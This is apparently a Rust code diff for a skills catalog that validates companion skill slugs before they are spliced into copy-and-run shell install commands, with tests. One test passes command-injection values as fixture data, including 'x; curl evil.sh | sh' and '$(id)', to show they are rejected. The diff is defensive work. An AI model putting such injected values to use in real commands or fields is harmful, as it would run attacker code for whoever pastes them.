@@ -3669,13 +3669,34 @@ fn agent_skills_catalog_skill(
     }
 }
 
+/// Keep only companions that are real, distinct, non-self skill slugs.
+///
+/// Companion values reach this point straight from `metadata.companion-skills`
+/// in a SKILL.md, and the catalog splices them into shell commands that users
+/// copy and run. A value with whitespace would break the published command, and
+/// one carrying shell metacharacters would execute for whoever pasted it. The
+/// primary slug already passes through `is_valid_skill_name`; companions get the
+/// same gate here. Self-references and duplicates are dropped too, since either
+/// only produces a redundant install step.
+fn valid_companion_skills(slug: &str, companion_skills: &[String]) -> Vec<String> {
+    let mut seen = BTreeSet::new();
+    companion_skills
+        .iter()
+        .filter(|companion| is_valid_skill_name(companion))
+        .filter(|companion| companion.as_str() != slug)
+        .filter(|companion| seen.insert((*companion).clone()))
+        .cloned()
+        .collect()
+}
+
 fn agent_skills_catalog_skill_install_commands(
     slug: &str,
     companion_skills: &[String],
 ) -> AgentSkillsCatalogSkillInstallCommands {
+    let companions = valid_companion_skills(slug, companion_skills);
     let chain = |template: &str| -> String {
         let mut command = template.replace("{slug}", slug);
-        for companion in companion_skills {
+        for companion in &companions {
             command.push_str(" && ");
             command.push_str(&template.replace("{slug}", companion));
         }
@@ -3869,12 +3890,16 @@ fn skill_inventory_entry(
         readme: readme.reliable_for_missing_signals,
         docs_index: docs_index.reliable_for_missing_signals,
     };
+    let companion_skills = frontmatter
+        .map(|frontmatter| frontmatter.companion_skills.clone())
+        .unwrap_or_default();
     let underbuilt_signals = skill_underbuilt_signals(
         &resources,
         &exposure,
         &package,
         &validation,
         catalog_reliability,
+        &companion_skills,
     );
 
     Ok(SkillInventoryEntry {
@@ -3886,9 +3911,7 @@ fn skill_inventory_entry(
             .map(|frontmatter| frontmatter.allowed_tools.clone())
             .unwrap_or_default(),
         metadata_present: frontmatter.is_some_and(|frontmatter| frontmatter.metadata_present),
-        companion_skills: frontmatter
-            .map(|frontmatter| frontmatter.companion_skills.clone())
-            .unwrap_or_default(),
+        companion_skills,
         path: repo_relative_string(repo_root, skill_dir),
         skill_md: repo_relative_string(repo_root, skill_md),
         resources,
@@ -3932,6 +3955,7 @@ fn skill_inventory_unreadable_entry(
         &package,
         &validation,
         catalog_reliability,
+        &[],
     );
 
     SkillInventoryEntry {
@@ -4334,10 +4358,20 @@ fn skill_underbuilt_signals(
     package: &SkillPackageStatus,
     validation: &SkillValidationStatus,
     catalogs: CatalogInputReliability,
+    companion_skills: &[String],
 ) -> Vec<String> {
     let mut signals = Vec::new();
     if !validation.valid {
         signals.push("invalid_frontmatter".to_string());
+    }
+    // The install-command builder drops companions that are not valid slugs.
+    // Report the drop so a typo surfaces as a signal instead of silently
+    // shortening the published install chain.
+    if companion_skills
+        .iter()
+        .any(|companion| !is_valid_skill_name(companion))
+    {
+        signals.push("invalid_companion_skills".to_string());
     }
     if catalogs.readme && !exposure.readme_catalog {
         signals.push("missing_readme_catalog".to_string());
@@ -8071,6 +8105,106 @@ description: Archived plugin skill.
                 && issue.skill.as_deref() == Some("plugin-skill")
                 && issue.path.as_deref() == Some("plugins/web-motion/skills/plugin-skill/SKILL.md")
         }));
+    }
+
+    #[test]
+    fn install_commands_reject_unsafe_companion_slugs() {
+        // Companions are spliced into shell commands users copy and run, so a
+        // value carrying metacharacters must never reach the published string.
+        let commands = agent_skills_catalog_skill_install_commands(
+            "better-interface",
+            &[
+                "better-layout".to_string(),
+                "x; curl evil.sh | sh".to_string(),
+                "two words".to_string(),
+                "$(id)".to_string(),
+                "Better-Colors".to_string(),
+                "--bad".to_string(),
+            ],
+        );
+
+        for command in [
+            &commands.codex_global,
+            &commands.codex_project,
+            &commands.all_agents,
+        ] {
+            assert!(
+                command.contains("better-layout"),
+                "kept the valid companion"
+            );
+            for injected in [
+                ";",
+                "|",
+                "$",
+                "(",
+                ")",
+                "curl",
+                "two words",
+                "Better-Colors",
+            ] {
+                assert!(
+                    !command.contains(injected),
+                    "unsafe companion fragment {injected:?} reached: {command}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn install_commands_drop_duplicate_and_self_companions() {
+        let commands = agent_skills_catalog_skill_install_commands(
+            "better-interface",
+            &[
+                "better-interface".to_string(),
+                "better-layout".to_string(),
+                "better-layout".to_string(),
+            ],
+        );
+
+        assert_eq!(
+            commands.codex_project,
+            "npx skills add BjornMelin/dev-skills --skill better-interface -a codex \
+&& npx skills add BjornMelin/dev-skills --skill better-layout -a codex"
+        );
+    }
+
+    #[test]
+    fn invalid_companion_slugs_raise_a_signal() {
+        let present = || SkillResourceStatus {
+            path: "skills/x/references".to_string(),
+            present: true,
+            files: 1,
+            capped: false,
+        };
+        let signals = skill_underbuilt_signals(
+            &SkillResourceInventory {
+                references: present(),
+                scripts: present(),
+                assets: present(),
+                templates: present(),
+                agents: present(),
+            },
+            &SkillExposure {
+                readme_catalog: true,
+                docs_index: true,
+            },
+            &SkillPackageStatus {
+                path: "skills/dist/x.skill".to_string(),
+                present: true,
+                rejected: false,
+            },
+            &SkillValidationStatus {
+                valid: true,
+                errors: Vec::new(),
+            },
+            CatalogInputReliability {
+                readme: true,
+                docs_index: true,
+            },
+            &["not a slug".to_string()],
+        );
+
+        assert!(signals.iter().any(|s| s == "invalid_companion_skills"));
     }
 
     #[test]
